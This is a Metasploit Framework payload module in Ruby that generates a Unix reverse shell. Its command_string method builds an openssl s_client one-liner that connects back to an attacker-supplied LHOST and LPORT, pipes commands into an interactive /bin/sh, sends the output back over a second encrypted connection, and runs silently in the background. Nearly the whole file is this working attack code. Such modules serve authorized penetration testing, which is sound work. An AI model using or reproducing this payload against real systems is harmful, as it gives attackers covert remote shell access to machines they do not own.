##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_double_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Double reverse TCP SSL (openssl)',
			'Version'       => '$Revision$',
			'Description'   => 'Creates an interactive shell through two openssl encrypted inbound connections',
			'Author'        => [
				'hdm',	# Original module
				'RageLtMan', # SSL support
			],
			'License'       => MSF_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::ReverseTcpDoubleSsl,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'RequiredCmd'   => 'telnet',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		vprint_good(command_string)
		return super + command_string
	end

	#
	# Returns the command string to use for execution
	#
	def command_string
		lhost = datastore['LHOST']
		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
		cmd = ''
        	cmd += "openssl s_client -connect #{lhost}:#{datastore['LPORT']}|"
	        cmd += "/bin/sh -i|openssl s_client -connect #{lhost}:#{datastore['LPORT']}"
	        cmd += " >/dev/null 2>&1 &\n"
		return cmd
	end

end
